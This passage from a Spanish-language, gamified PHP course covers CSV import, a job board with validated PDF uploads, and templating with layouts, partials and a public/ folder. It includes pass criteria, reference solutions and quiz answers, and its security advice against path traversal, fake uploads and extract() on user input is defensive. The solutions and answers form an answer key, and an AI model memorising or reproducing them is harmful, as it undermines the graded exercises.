                $errores[] = "Renglón $numero: código inválido «{$codigo}».";
            } elseif ($producto === '') {
                $errores[] = "Renglón $numero: falta el producto.";
            } elseif (!is_numeric(str_replace(',', '.', $precio)) || (float) str_replace(',', '.', $precio) <= 0) {
                $errores[] = "Renglón $numero: precio inválido «{$precio}».";
            } else {
                $nuevos[strtoupper($codigo)] = ['producto' => $producto, 'precio' => (float) str_replace(',', '.', $precio)];
            }
        }
        fclose($f);
        if ($errores === []) {
            $precios = $nuevos + $precios;
            if (!is_dir(dirname(ARCHIVO))) {
                mkdir(dirname(ARCHIVO), 0775, true);
            }
            file_put_contents(ARCHIVO, json_encode($precios, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);
            $importados = count($nuevos);
        }
    }
}
ksort($precios);
?>
<h1>Importar precios</h1>
<?php if ($importados !== null): ?><p>Importaste <?= $importados ?> precio/s.</p><?php endif; ?>
<?php foreach ($errores as $e): ?><p><?= htmlspecialchars($e) ?></p><?php endforeach; ?>
<?php if ($errores !== []): ?><p>No se guardó nada: corregí el archivo y volvé a subirlo.</p><?php endif; ?>
<form method="post" enctype="multipart/form-data">
    <input type="hidden" name="csrf" value="<?= $_SESSION['csrf'] ?>">
    <input type="file" name="csv" accept=".csv,text/csv"> <button>Importar</button>
</form>
<table>
    <?php foreach ($precios as $codigo => $p): ?>
        <tr><td><?= htmlspecialchars($codigo) ?></td><td><?= htmlspecialchars($p['producto']) ?></td><td><?= number_format($p['precio'], 2, ',', '.') ?></td></tr>
    <?php endforeach; ?>
</table>
```

### Encargo R03-N07-E1 · La bolsa de trabajo

```meta
entrega: codigo
entorno: local
monedas: 1
xp: 15
```

#### Consigna

Una municipalidad arma una bolsa de trabajo. Escribí `postulacion.php`, donde una
persona deja su nombre, email, el puesto (lista fija: `administrativo`,
`maestranza`, `atención al público`, `sistemas`) y su **CV en PDF** (hasta 2 MB,
validado con `finfo`). Guardá los CV en `cvs/` con un nombre generado y las
postulaciones en `datos/postulaciones.json`. Reglas extra:

- no se acepta dos veces el mismo email para el mismo puesto (`Ya te postulaste a
  ese puesto.`);
- el nombre original del PDF se guarda como dato, escapado al mostrarlo;
- abajo, un **resumen por puesto** con la cantidad de postulaciones (sin mostrar los
  datos personales).

Con CSRF, validación completa y PRG.

#### Criterio de aprobación

- Solo acepta PDF reales, con nombre generado.
- Evita la postulación duplicada con los datos del JSON.
- Muestra el resumen por puesto sin datos personales.

#### Solución de referencia

```php
<?php
declare(strict_types=1);
// Encargo - La bolsa de trabajo: subir un PDF, evitar duplicados y resumir.
session_start();
const PUESTOS = ['administrativo', 'maestranza', 'atención al público', 'sistemas'];
const DATOS = __DIR__ . '/datos/postulaciones.json';
const CVS = __DIR__ . '/cvs';

function leer(): array
{
    return file_exists(DATOS) ? json_decode(file_get_contents(DATOS), true, flags: JSON_THROW_ON_ERROR) : [];
}

function guardar(array $d): void
{
    if (!is_dir(dirname(DATOS))) {
        mkdir(dirname(DATOS), 0775, true);
    }
    file_put_contents(DATOS, json_encode($d, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE), LOCK_EX);
}

$_SESSION['csrf'] ??= bin2hex(random_bytes(32));
$postulaciones = leer();
$error = null;

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!hash_equals($_SESSION['csrf'], $_POST['csrf'] ?? '')) {
        http_response_code(403);
        exit('Pedido no válido.');
    }
    $nombre = trim($_POST['nombre'] ?? '');
    $email = mb_strtolower(trim($_POST['email'] ?? ''));
    $puesto = $_POST['puesto'] ?? '';
    $cv = $_FILES['cv'] ?? null;
    $repetida = array_filter($postulaciones, fn(array $p): bool => $p['email'] === $email && $p['puesto'] === $puesto);

    if ($nombre === '' || filter_var($email, FILTER_VALIDATE_EMAIL) === false) {
        $error = 'Completá tu nombre y un email válido.';
    } elseif (!in_array($puesto, PUESTOS, true)) {
        $error = 'Elegí un puesto de la lista.';
    } elseif ($repetida !== []) {
        $error = 'Ya te postulaste a ese puesto.';
    } elseif ($cv === null || $cv['error'] !== UPLOAD_ERR_OK || $cv['size'] > 2 * 1024 * 1024) {
        $error = 'Adjuntá tu CV (hasta 2 MB).';
    } elseif ((new finfo(FILEINFO_MIME_TYPE))->file($cv['tmp_name']) !== 'application/pdf') {
        $error = 'El CV tiene que ser un PDF.';
    } else {
        if (!is_dir(CVS)) {
            mkdir(CVS, 0775, true);
        }
        $archivo = bin2hex(random_bytes(8)) . '.pdf';
        move_uploaded_file($cv['tmp_name'], CVS . '/' . $archivo);
        $postulaciones[] = ['nombre' => $nombre, 'email' => $email, 'puesto' => $puesto, 'cv' => $archivo, 'original' => $cv['name']];
        guardar($postulaciones);
        $_SESSION['flash'] = "¡Gracias, $nombre! Recibimos tu CV «{$cv['name']}».";
        header('Location: postulacion.php', true, 303);
        exit;
    }
}
$flash = $_SESSION['flash'] ?? null;
unset($_SESSION['flash']);
$porPuesto = array_fill_keys(PUESTOS, 0);
foreach ($postulaciones as $p) {
    $porPuesto[$p['puesto']]++;
}
?>
<h1>Bolsa de trabajo municipal</h1>
<?php if ($flash !== null): ?><p><?= htmlspecialchars($flash) ?></p><?php endif; ?>
<?php if ($error !== null): ?><p><strong><?= htmlspecialchars($error) ?></strong></p><?php endif; ?>
<form method="post" enctype="multipart/form-data">
    <input type="hidden" name="csrf" value="<?= $_SESSION['csrf'] ?>">
    <input name="nombre"> <input name="email">
    <select name="puesto"><?php foreach (PUESTOS as $p): ?><option><?= $p ?></option><?php endforeach; ?></select>
    <input type="file" name="cv" accept="application/pdf"> <button>Postularme</button>
</form>
<h2>Postulaciones por puesto</h2>
<ul>
    <?php foreach ($porPuesto as $puesto => $cantidad): ?>
        <li><?= htmlspecialchars($puesto) ?>: <?= $cantidad ?></li>
    <?php endforeach; ?>
</ul>
```

### Prueba del sello

#### ¿Qué le falta a un formulario si `$_FILES` llega vacío?

El atributo `enctype="multipart/form-data"` (y tiene que ser `method="post"`).

#### ¿Por qué no se confía en `$_FILES['x']['type']` ni en la extensión?

Porque los escribe el navegador (o quien ataca): el tipo real se mira con `finfo`, que lee el contenido del archivo.

#### ¿Por qué se guarda el archivo con un nombre generado?

Para que nadie pueda pisar otros archivos, escribir fuera de la carpeta con `../` o subir un `.php` que después se ejecute.

#### ¿Para qué sirve `LOCK_EX` en `file_put_contents`?

Para bloquear el archivo mientras se escribe, así dos pedidos al mismo tiempo no mezclan sus datos.

#### ¿Qué hace `JSON_THROW_ON_ERROR`?

Hace que un JSON roto lance una excepción en lugar de devolver `null` en silencio.

### Soluciones (docente)

Sale de `21-PHP/13-Manejo-Archivos` (la parte de JSON), llevado a la web con subidas. Es el mismo criterio que usa esta plataforma para comprobantes y entregas (disco privado, tipo real, nombres generados). Para probar en clase conviene tener a mano un PDF chico, una imagen y un archivo `.php` renombrado a `.png`.

## R03-N08 · Plantillas y organización

```meta
tipo: tema
padre: R03-N07
precio: 10
criatura: ogre
temas: web.plantillas
usa: html.estructura
```

### Crónica

La Oficina de Correos creció: ya tiene veinte ventanillas, y cada una tenía su propio cartel pintado a mano, con el logo del Puerto un poco distinto en cada una. Cuando cambió el horario de atención, hubo que repintar los veinte carteles. {mentor} mandó hacer un **molde de cartel**: el mismo marco, el mismo logo, el mismo horario, y en el medio, un espacio para lo que es propio de cada ventanilla.

—Tus páginas repiten el mismo encabezado, el mismo menú, el mismo pie —dice—. Si mañana cambia el menú, ¿vas a tocar veinte archivos? Se arma un **molde** y cada página solo pone su parte. Y de paso, {heroe}, separamos el trabajo: por un lado se **decide** qué mostrar, por el otro se **muestra**.

### Objetivos

- Separar la lógica (qué datos hay) de la presentación (cómo se muestran).
- Armar un layout común y vistas que se meten adentro.
- Escribir una función `vista()` con `extract` y `ob_start`.
- Reutilizar pedacitos de página (parciales).
- Organizar el proyecto con una carpeta `public/` y el resto fuera del alcance de la web.

### Antes de empezar

- Formularios, sesiones y seguridad (R03-N03 a R03-N07) y organizar archivos (R01-N09).

### Explicación

#### El problema
Hasta ahora, cada página tiene el `<!DOCTYPE>`, el `<head>`, el menú y el pie
copiados, y el PHP mezclado con el HTML. Funciona con tres páginas; con veinte es
imposible de mantener.

#### Separar lógica y vista
- El **controlador** (la página) hace el trabajo: lee el pedido, valida, busca los
  datos, decide.
- La **vista** (un archivo aparte) solo muestra: recibe los datos y los pone en el
  HTML, con `<?= e($x) ?>`, `foreach` e `if`. Nada de lógica pesada.

#### La función `vista()`
```php
function vista(string $__vista, array $__datos = []): string
{
    extract($__datos);                            // ['titulo' => 'Hola'] crea $titulo
    ob_start();                                   // empieza a "capturar" la salida
    require __DIR__ . "/../vistas/$__vista.php";  // la vista imprime…
    return ob_get_clean();                        // …y lo capturado se devuelve como texto
}
```
- `extract` convierte las claves del array en variables para la vista.
- Los parámetros se llaman `$__vista` y `$__datos` (raros a propósito): `extract` crea
  variables con los nombres de las claves, y si una vista recibiera un dato llamado
  `nombre`, pisaría un parámetro `$nombre` de la función.
- `ob_start` / `ob_get_clean` (*output buffering*) capturan todo lo que se imprime
  en lugar de mandarlo al navegador. Así una vista se puede meter dentro de otra.

#### El layout
Una vista especial con lo común, que recibe el contenido ya armado:
```php
<!-- vistas/layout.php -->
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title><?= e($titulo) ?> · Puerto</title></head>
<body>
    <?= vista('parciales/menu') ?>
    <main><?= $contenido ?></main>     <!-- ya viene escapado de su vista -->
    <footer>Puerto de los Mensajeros</footer>
</body>
</html>
```
Y cada página:
```php
$contenido = vista('barcos/lista', ['barcos' => $barcos]);
echo vista('layout', ['titulo' => 'Barcos', 'contenido' => $contenido]);
```
El menú y el pie están en **un solo lugar**.

#### La carpeta `public/`
Una estructura típica:
```
correo/
├── public/              ← la ÚNICA carpeta que ve la web (php -S -t public)
│   ├── index.php        ← la página (o el "controlador frontal")
│   └── estilos.css
├── src/                 ← funciones y clases
│   └── funciones.php
├── vistas/
│   ├── layout.php
│   ├── parciales/menu.php
│   └── inicio.php
└── datos/               ← JSON, subidas privadas: fuera de public/
```
Con `php -S localhost:8000 -t public`, nadie puede pedir `/../datos/usuarios.json`
ni ver el código de `src/`: la web solo llega a `public/`. Así se configura también
un hosting (la carpeta pública del dominio apunta a `public/`).

#### Un solo punto de entrada
Un paso más: **todas** las páginas pasan por `public/index.php`, que decide qué
mostrar según un parámetro (`?pagina=barcos`) o la ruta. Se llama *controlador
frontal*: así la configuración, la sesión y la seguridad se cargan en un solo lugar.
En la rama 5 lo vas a convertir en un router de verdad (`/barcos/12`).

### Código de ejemplo

`src/funciones.php`
```php
<?php
declare(strict_types=1);

function e(string $t): string
{
    return htmlspecialchars($t, ENT_QUOTES, 'UTF-8');
}

function vista(string $__vista, array $__datos = []): string
{
    extract($__datos);
    ob_start();
    require __DIR__ . "/../vistas/$__vista.php";
    return ob_get_clean();
}

function pesos(float $monto): string
{
    return '$' . number_format($monto, 2, ',', '.');
}
```

`vistas/layout.php`
```php
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="utf-8">
    <title><?= e($titulo) ?> · Correo del Puerto</title>
</head>
<body>
    <?= vista('parciales/menu', ['actual' => $actual ?? '']) ?>
    <main>
        <h1><?= e($titulo) ?></h1>
        <?= $contenido ?>
    </main>
    <footer>Correo del Puerto de los Mensajeros · abierto de 8 a 20</footer>
</body>
</html>
```

`vistas/parciales/menu.php`
```php
<nav>
    <?php foreach (['inicio' => 'Inicio', 'tarifas' => 'Tarifas', 'contacto' => 'Contacto'] as $pagina => $texto): ?>
        <?php if ($pagina === $actual): ?>
            <strong><?= $texto ?></strong>
        <?php else: ?>
            <a href="?pagina=<?= $pagina ?>"><?= $texto ?></a>
        <?php endif; ?>
    <?php endforeach; ?>
</nav>
```

`vistas/inicio.php`
```php
<p>Hoy despachamos <?= $despachos ?> cartas.</p>
<p>Novedad: <?= e($novedad) ?></p>
```

`vistas/tarifas.php`
```php
<table>
    <tr><th>Destino</th><th>Precio</th></tr>
    <?php foreach ($tarifas as $destino => $precio): ?>
        <tr><td><?= e($destino) ?></td><td><?= pesos($precio) ?></td></tr>
    <?php endforeach; ?>
</table>
```

`vistas/404.php`
```php
<p>No encontramos «<?= e($pedida) ?>». Volvé al <a href="?pagina=inicio">inicio</a>.</p>
```

`public/index.php`
```php
<?php
declare(strict_types=1);
/*
 * El molde de cartel: un punto de entrada, un layout y vistas separadas de la lógica.
 * Se prueba con: php -S localhost:8000 -t public
 */
require __DIR__ . '/../src/funciones.php';

$pagina = $_GET['pagina'] ?? 'inicio';

switch ($pagina) {
    case 'inicio':
        $titulo = 'Bienvenida';
        $contenido = vista('inicio', ['despachos' => 1284, 'novedad' => 'Nuevo ferry a la Ciudadela <los jueves>']);
        break;
    case 'tarifas':
        $titulo = 'Tarifas';
        $contenido = vista('tarifas', ['tarifas' => ['Valle' => 1800, 'Forjas' => 5250.5, 'Imperio' => 12999.99]]);
        break;
    default:
        http_response_code(404);
        $titulo = 'Página no encontrada';
        $contenido = vista('404', ['pedida' => $pagina]);
}

echo vista('layout', ['titulo' => $titulo, 'contenido' => $contenido, 'actual' => $pagina]);
```

### ¿Para qué sirve?

Así están armados todos los frameworks: Laravel tiene sus vistas Blade con `@extends('layout')` y `@include`, y un `public/index.php` por donde pasa todo. Al hacerlo a mano entendés qué pasa por debajo, y un proyecto chico sin framework queda ordenado: cambiar el menú es tocar un archivo, y la lógica se prueba sin mirar el HTML.

### Errores habituales

**Esqueleto: la variable que no llega a la vista.** `Undefined variable $barcos` en la
vista: no la pasaste en el array de `vista('…', [...])`. Cada vista solo ve lo que
le mandás.

**Troll: escapar dos veces (o ninguna).** El `$contenido` que llega al layout ya es
HTML armado: si le pasás `e()`, se ve el código. Los datos se escapan en la vista
que los muestra, una sola vez.

**Ogro: lógica en la vista.** Consultas, validaciones o cálculos largos en la vista
hacen imposible reusarla. Se calculan en el controlador y se pasan listos.

**Troll: `extract` que pisa variables.** Si `vista()` tuviera un parámetro
`$nombre` y una vista recibiera `['nombre' => 'barco']`, `extract` lo pisaría y se
buscaría la vista `barco.php` (`Failed opening required …/vistas/barco.php`). Por eso
los parámetros de `vista()` tienen nombres que ninguna vista usa.

**Troll: `extract` con datos del usuario.** `extract($_POST)` crea variables con
cualquier nombre que mande el visitante (y puede pisar las tuyas). Solo con arrays
que armaste vos.

**Esqueleto: el servidor en la carpeta equivocada.** Sin `-t public`, la web ve todo
el proyecto (incluidos `datos/` y `src/`). Con `-t public`, solo lo público.

### Misión R03-N08-M1 · El sitio del club con layout

```meta
entrega: archivo
entorno: local
extensiones: zip
monedas: 4
xp: 10
```

#### Consigna

Armá el sitio del club del puerto con la estructura `public/`, `src/`, `vistas/`:

- `public/index.php` — punto de entrada con `?pagina=` (`inicio`, `actividades`,
  `horarios`) y un 404 para lo demás;
- un layout con el menú (la página actual sin enlace) y el pie;
- `actividades` muestra una lista de actividades con su cuota (formateada con una
  función `pesos()`);
- `horarios` muestra una tabla de días y horarios armada con dos `foreach`;
- el título de cada página sale de un array `TITULOS` en el punto de entrada.

#### Criterio de aprobación

- Una función `vista()` con `extract` y `ob_start` y un layout común.
- Las vistas no tienen lógica pesada: reciben los datos listos.
- Página inexistente responde 404 dentro del layout.

#### Solución de referencia

`src/funciones.php`
```php
<?php
declare(strict_types=1);

function e(string $t): string
{
    return htmlspecialchars($t, ENT_QUOTES, 'UTF-8');
}

function vista(string $__vista, array $__datos = []): string
{
    extract($__datos);
    ob_start();
    require __DIR__ . "/../vistas/$__vista.php";
    return ob_get_clean();
}

function pesos(float $monto): string
{
    return '$' . number_format($monto, 2, ',', '.');
}
```

`vistas/layout.php`
```php
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title><?= e($titulo) ?> · Club del Puerto</title></head>
<body>
    <nav>
        <?php foreach ($menu as $pagina => $texto): ?>
            <?= $pagina === $actual ? '<strong>' . e($texto) . '</strong>' : '<a href="?pagina=' . e($pagina) . '">' . e($texto) . '</a>' ?>
        <?php endforeach; ?>
    </nav>
    <h1><?= e($titulo) ?></h1>
    <?= $contenido ?>
    <footer>Club Social del Puerto · Av. Costanera 120</footer>
</body>
</html>
```

`vistas/inicio.php`
```php
<p>Bienvenida al club. Somos <?= $socios ?> socios.</p>
```

`vistas/actividades.php`
```php
<ul>
    <?php foreach ($actividades as $nombre => $cuota): ?>
        <li><?= e($nombre) ?>: <?= pesos($cuota) ?> por mes</li>
    <?php endforeach; ?>
</ul>
```

`vistas/horarios.php`
```php
<table>
    <?php foreach ($horarios as $dia => $turnos): ?>
        <tr><th><?= e($dia) ?></th>
            <?php foreach ($turnos as $turno): ?><td><?= e($turno) ?></td><?php endforeach; ?>
        </tr>
    <?php endforeach; ?>
</table>
```

`vistas/404.php`
```php
<p>No existe la página «<?= e($pedida) ?>».</p>
```

`public/index.php`
```php
<?php
declare(strict_types=1);
// Mision 1 - El sitio del club con layout: un punto de entrada y vistas.
require __DIR__ . '/../src/funciones.php';
const TITULOS = ['inicio' => 'Inicio', 'actividades' => 'Actividades', 'horarios' => 'Horarios'];

$pagina = $_GET['pagina'] ?? 'inicio';
$contenido = match ($pagina) {
    'inicio' => vista('inicio', ['socios' => 312]),
    'actividades' => vista('actividades', ['actividades' => ['Fútbol' => 18000, 'Natación' => 24000, 'Patín' => 15000]]),
    'horarios' => vista('horarios', ['horarios' => ['Lunes' => ['Natación 18 h', 'Fútbol 20 h'], 'Sábado' => ['Patín 10 h']]]),
    default => null,
};
if ($contenido === null) {
    http_response_code(404);
    $contenido = vista('404', ['pedida' => $pagina]);
}
echo vista('layout', [
    'titulo' => TITULOS[$pagina] ?? 'No encontrada',
    'contenido' => $contenido,
    'menu' => TITULOS,
    'actual' => $pagina,
]);
```

### Misión R03-N08-M2 · Los parciales reutilizables

```meta
entrega: archivo
entorno: local
extensiones: zip
monedas: 4
xp: 10
```

#### Consigna

Una tienda muestra productos en varias páginas (la portada con destacados y la
página de ofertas) y en las dos se ve **la misma tarjeta de producto**. Armá:

- `vistas/parciales/tarjeta.php` — la tarjeta de un producto (nombre, precio, y si
  tiene descuento, el precio tachado con `<del>` y el nuevo);
- `vistas/parciales/alerta.php` — un mensaje con un tipo (`info` o `error`) que se
  usa como `<div class="alerta alerta-info">`;
- `vistas/portada.php` y `vistas/ofertas.php`, que usan `vista('parciales/tarjeta', …)`
  en un `foreach`;
- `public/index.php` con las dos páginas; en ofertas, si no hay ninguna, la alerta
  `No hay ofertas por ahora.`

#### Criterio de aprobación

- La tarjeta está en un solo archivo y se usa desde las dos páginas.
- La alerta recibe el tipo y el mensaje.
- El tipo de alerta se valida (solo `info` o `error`).

#### Solución de referencia

`src/funciones.php`
```php
<?php
declare(strict_types=1);

function e(string $t): string
{
    return htmlspecialchars($t, ENT_QUOTES, 'UTF-8');
}

function vista(string $__vista, array $__datos = []): string
{
    extract($__datos);
    ob_start();
    require __DIR__ . "/../vistas/$__vista.php";
    return ob_get_clean();
}
```

`vistas/parciales/tarjeta.php`
```php
<article class="tarjeta">
    <h3><?= e($producto['nombre']) ?></h3>
    <?php if (($producto['descuento'] ?? 0) > 0): ?>
        <p><del>$<?= $producto['precio'] ?></del> $<?= round($producto['precio'] * (1 - $producto['descuento'] / 100)) ?> (−<?= $producto['descuento'] ?>%)</p>
    <?php else: ?>
        <p>$<?= $producto['precio'] ?></p>
    <?php endif; ?>
</article>
```

`vistas/parciales/alerta.php`
```php
<?php $tipo = in_array($tipo ?? '', ['info', 'error'], true) ? $tipo : 'info'; ?>
<div class="alerta alerta-<?= $tipo ?>"><?= e($mensaje) ?></div>
```

`vistas/portada.php`
```php
<h1>Destacados</h1>
<?php foreach ($productos as $p): ?>
    <?= vista('parciales/tarjeta', ['producto' => $p]) ?>
<?php endforeach; ?>
```

`vistas/ofertas.php`
```php
<h1>Ofertas</h1>
<?php if ($productos === []): ?>
    <?= vista('parciales/alerta', ['tipo' => 'info', 'mensaje' => 'No hay ofertas por ahora.']) ?>
<?php endif; ?>
<?php foreach ($productos as $p): ?>
    <?= vista('parciales/tarjeta', ['producto' => $p]) ?>
<?php endforeach; ?>
```

`public/index.php`
```php
<?php
declare(strict_types=1);
// Mision 2 - Los parciales reutilizables: la misma tarjeta en dos páginas.
require __DIR__ . '/../src/funciones.php';

$productos = [
    ['nombre' => 'Farol de bronce', 'precio' => 45000, 'descuento' => 20],
    ['nombre' => 'Ancla decorativa', 'precio' => 18000],
    ['nombre' => 'Brújula antigua', 'precio' => 32000, 'descuento' => 10],
];
$ofertas = array_filter($productos, fn(array $p): bool => ($p['descuento'] ?? 0) > 0);
if (isset($_GET['sin_ofertas'])) {
    $ofertas = [];
}

echo match ($_GET['pagina'] ?? 'portada') {
    'ofertas' => vista('ofertas', ['productos' => $ofertas]),
    default => vista('portada', ['productos' => $productos]),
};
```

### Misión R03-N08-M3 · El formulario con molde

```meta
entrega: archivo
entorno: local
extensiones: zip
monedas: 4
xp: 10
```

#### Consigna

Tomá el formulario de inscripción a la regata (R03-N03-M1) y reorganizalo:

- `public/index.php` — solo la lógica: lee el POST, valida con una función
  `validarInscripcion(array $datos): array` (en `src/validacion.php`, devuelve los
  errores por campo) y elige la vista;
- `vistas/formulario.php` — el formulario, que usa un **parcial**
  `vistas/parciales/campo.php` para cada campo de texto (etiqueta, nombre, valor y
  error);
- `vistas/confirmacion.php` — el mensaje de inscripción.

La validación y los mensajes son los mismos que en aquella misión (sin el checkbox
del reglamento, para acortar).

#### Criterio de aprobación

- La validación está en una función que no imprime nada.
- Los campos de texto se dibujan con un parcial.
- `public/index.php` no tiene HTML.

#### Solución de referencia

`src/funciones.php`
```php
<?php
declare(strict_types=1);

function e(string $t): string
{
    return htmlspecialchars($t, ENT_QUOTES, 'UTF-8');
}

function vista(string $__vista, array $__datos = []): string
{
    extract($__datos);
    ob_start();
    require __DIR__ . "/../vistas/$__vista.php";
    return ob_get_clean();
}
```

`src/validacion.php`
```php
<?php
declare(strict_types=1);

const CATEGORIAS = ['optimist', 'laser', 'crucero'];

/** Devuelve los errores por campo (vacío si está todo bien). */
function validarInscripcion(array $d): array
{
    $errores = [];
    $largo = mb_strlen($d['barco']);
    if ($largo < 3 || $largo > 30) {
        $errores['barco'] = 'El nombre del barco va de 3 a 30 caracteres.';
    }
    if ($d['capitan'] === '') {
        $errores['capitan'] = 'Falta quién capitanea.';
    }
    if (!in_array($d['categoria'], CATEGORIAS, true)) {
        $errores['categoria'] = 'Categoría inválida.';
    }
    if (filter_var($d['tripulantes'], FILTER_VALIDATE_INT, ['options' => ['min_range' => 1, 'max_range' => 8]]) === false) {
        $errores['tripulantes'] = 'Los tripulantes van de 1 a 8.';
    }
    return $errores;
}
```

`vistas/parciales/campo.php`
```php
<p>
    <label><?= e($etiqueta) ?>: <input name="<?= e($nombre) ?>" value="<?= e($valor) ?>"></label>
    <?php if ($error !== null): ?><strong><?= e($error) ?></strong><?php endif; ?>
</p>
```

`vistas/formulario.php`
```php
<h1>Regata del Puerto</h1>
<form method="post">
    <?= vista('parciales/campo', ['etiqueta' => 'Barco', 'nombre' => 'barco', 'valor' => $datos['barco'], 'error' => $errores['barco'] ?? null]) ?>
    <?= vista('parciales/campo', ['etiqueta' => 'Capitán/a', 'nombre' => 'capitan', 'valor' => $datos['capitan'], 'error' => $errores['capitan'] ?? null]) ?>
    <p><select name="categoria">
        <?php foreach ($categorias as $c): ?>
            <option <?= $datos['categoria'] === $c ? 'selected' : '' ?>><?= e($c) ?></option>
        <?php endforeach; ?>
    </select> <?= isset($errores['categoria']) ? e($errores['categoria']) : '' ?></p>
    <?= vista('parciales/campo', ['etiqueta' => 'Tripulantes', 'nombre' => 'tripulantes', 'valor' => $datos['tripulantes'], 'error' => $errores['tripulantes'] ?? null]) ?>
    <button>Inscribir</button>
</form>
```

`vistas/confirmacion.php`
```php
<p>Inscripto: <?= e($datos['barco']) ?> (<?= e($datos['categoria']) ?>) con <?= (int) $datos['tripulantes'] ?> tripulante/s. ¡Buena regata, <?= e($datos['capitan']) ?>!</p>
```

`public/index.php`
```php
<?php
declare(strict_types=1);
// Mision 3 - El formulario con molde: lógica separada de las vistas.
require __DIR__ . '/../src/funciones.php';
require __DIR__ . '/../src/validacion.php';

$datos = ['barco' => '', 'capitan' => '', 'categoria' => 'optimist', 'tripulantes' => '1'];
$errores = [];
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    foreach (array_keys($datos) as $campo) {
        $datos[$campo] = trim((string) ($_POST[$campo] ?? ''));
    }
    $errores = validarInscripcion($datos);
    if ($errores === []) {
        echo vista('confirmacion', ['datos' => $datos]);
        exit;
    }
}
echo vista('formulario', ['datos' => $datos, 'errores' => $errores, 'categorias' => CATEGORIAS]);
```

### Encargo R03-N08-E1 · El sitio de la inmobiliaria

```meta
entrega: archivo
entorno: local
extensiones: zip
monedas: 1
xp: 15
```

#### Consigna

La inmobiliaria El Faro quiere su sitio ordenado. Armá el proyecto con `public/`,
`src/`, `vistas/` y `datos/propiedades.json` (un JSON con 5 propiedades: código,
tipo `casa`/`depto`/`local`, operación `venta`/`alquiler`, barrio, ambientes y
precio). El punto de entrada tiene tres páginas:

- `?pagina=inicio` — las 3 propiedades más baratas en **alquiler** (parcial de
  tarjeta);
- `?pagina=buscar` — un formulario GET con operación y tipo (validados contra listas)
  y ambientes mínimos, que filtra la lista; muestra la cantidad de resultados;
- `?pagina=ficha&codigo=X` — la ficha de una propiedad (404 si el código no existe).

Leé el JSON con una función en `src/`, todas las páginas usan el mismo layout y la
misma tarjeta, y todo lo que sale del JSON o del pedido se escapa.

#### Criterio de aprobación

- Estructura `public/`, `src/`, `vistas/`, `datos/` con los datos fuera de `public/`.
- Layout, parcial de tarjeta y vistas sin lógica pesada.
- Filtros validados y 404 para la ficha inexistente.

#### Solución de referencia

`datos/propiedades.json`
```json
[
    {"codigo": "C-101", "tipo": "casa", "operacion": "venta", "barrio": "Centro", "ambientes": 4, "precio": 98000000},
    {"codigo": "D-204", "tipo": "depto", "operacion": "alquiler", "barrio": "Costanera", "ambientes": 2, "precio": 420000},
    {"codigo": "D-310", "tipo": "depto", "operacion": "alquiler", "barrio": "Centro", "ambientes": 3, "precio": 560000},
    {"codigo": "L-330", "tipo": "local", "operacion": "alquiler", "barrio": "Costanera", "ambientes": 1, "precio": 690000},
    {"codigo": "C-115", "tipo": "casa", "operacion": "alquiler", "barrio": "Faldeo", "ambientes": 5, "precio": 850000}
]
```

`src/funciones.php`
```php
<?php
declare(strict_types=1);

const OPERACIONES = ['venta', 'alquiler'];
const TIPOS = ['casa', 'depto', 'local'];

function e(string $t): string
{
    return htmlspecialchars($t, ENT_QUOTES, 'UTF-8');
}

function vista(string $__vista, array $__datos = []): string
{
    extract($__datos);
    ob_start();
    require __DIR__ . "/../vistas/$__vista.php";
    return ob_get_clean();
}

function pesos(float $monto): string
{
    return '$' . number_format($monto, 0, ',', '.');
}

function propiedades(): array
{
    return json_decode(file_get_contents(__DIR__ . '/../datos/propiedades.json'), true, flags: JSON_THROW_ON_ERROR);
}

function buscar(array $lista, string $operacion, string $tipo, int $ambientes): array
{
    return array_values(array_filter($lista, fn(array $p): bool =>
        ($operacion === '' || $p['operacion'] === $operacion)
        && ($tipo === '' || $p['tipo'] === $tipo)
        && $p['ambientes'] >= $ambientes));
}
```

`vistas/layout.php`
```php
<!DOCTYPE html>
<html lang="es">
<head><meta charset="utf-8"><title><?= e($titulo) ?> · Inmobiliaria El Faro</title></head>
<body>
    <nav><a href="?pagina=inicio">Inicio</a> · <a href="?pagina=buscar">Buscar</a></nav>
    <h1><?= e($titulo) ?></h1>
    <?= $contenido ?>
    <footer>Inmobiliaria El Faro · matrícula 1234</footer>
</body>
</html>
```

`vistas/parciales/tarjeta.php`
```php
<article>
    <h3><a href="?pagina=ficha&amp;codigo=<?= urlencode($p['codigo']) ?>"><?= e(ucfirst($p['tipo'])) ?> en <?= e($p['barrio']) ?></a></h3>
    <p><?= $p['ambientes'] ?> amb. · <?= e($p['operacion']) ?> · <?= pesos($p['precio']) ?></p>
</article>
```

`vistas/inicio.php`
```php
<h2>Alquileres más accesibles</h2>
<?php foreach ($destacadas as $p): ?>
    <?= vista('parciales/tarjeta', ['p' => $p]) ?>
<?php endforeach; ?>
```

`vistas/buscar.php`
```php
<form method="get">
    <input type="hidden" name="pagina" value="buscar">
    <select name="operacion"><option value="">todas</option>
        <?php foreach (OPERACIONES as $o): ?><option <?= $o === $operacion ? 'selected' : '' ?>><?= $o ?></option><?php endforeach; ?>
    </select>
    <select name="tipo"><option value="">todos</option>
        <?php foreach (TIPOS as $t): ?><option <?= $t === $tipo ? 'selected' : '' ?>><?= $t ?></option><?php endforeach; ?>
    </select>
    <input type="number" name="ambientes" value="<?= $ambientes ?>" min="0">
    <button>Buscar</button>
</form>
<p><?= count($resultados) ?> propiedad/es</p>
<?php foreach ($resultados as $p): ?>
    <?= vista('parciales/tarjeta', ['p' => $p]) ?>
<?php endforeach; ?>
```

`vistas/ficha.php`
```php
<dl>
    <dt>Código</dt><dd><?= e($p['codigo']) ?></dd>
    <dt>Tipo</dt><dd><?= e($p['tipo']) ?> en <?= e($p['operacion']) ?></dd>
    <dt>Barrio</dt><dd><?= e($p['barrio']) ?></dd>
    <dt>Ambientes</dt><dd><?= $p['ambientes'] ?></dd>
    <dt>Precio</dt><dd><?= pesos($p['precio']) ?></dd>
</dl>
```

`public/index.php`
```php
<?php
declare(strict_types=1);
// Encargo - El sitio de la inmobiliaria: layout, parciales, JSON y filtros.
require __DIR__ . '/../src/funciones.php';

$lista = propiedades();
$pagina = $_GET['pagina'] ?? 'inicio';

switch ($pagina) {
    case 'buscar':
        $operacion = in_array($_GET['operacion'] ?? '', OPERACIONES, true) ? $_GET['operacion'] : '';
